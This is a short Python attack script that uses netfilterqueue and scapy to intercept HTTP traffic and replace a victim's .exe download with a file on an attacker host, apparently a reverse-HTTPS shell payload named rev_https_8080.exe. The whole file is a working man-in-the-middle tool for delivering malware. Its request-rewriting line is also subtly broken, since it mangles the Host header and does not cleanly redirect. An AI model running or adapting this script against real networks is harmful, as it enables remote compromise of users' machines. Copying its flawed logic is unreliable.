#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            # HTTP Request
            http_request = scapy_packet[scapy.Raw].load.decode()
            if ".exe" in http_request:
                print("[+] exe Download Request")
                # Replace the IP address with the attacker's IP address
                http_request = http_request.replace("Host: ", " http://192.168.19.35/evil_files/rev_https_8080.exe")
                print("[+] Modified HTTP Request")
                # Update the packet with the modified HTTP request
                scapy_packet[scapy.Raw].load = http_request.encode()
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            # HTTP Response
            print("[+] HTTP Response")
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] User requested program termination...")
    queue.unbind()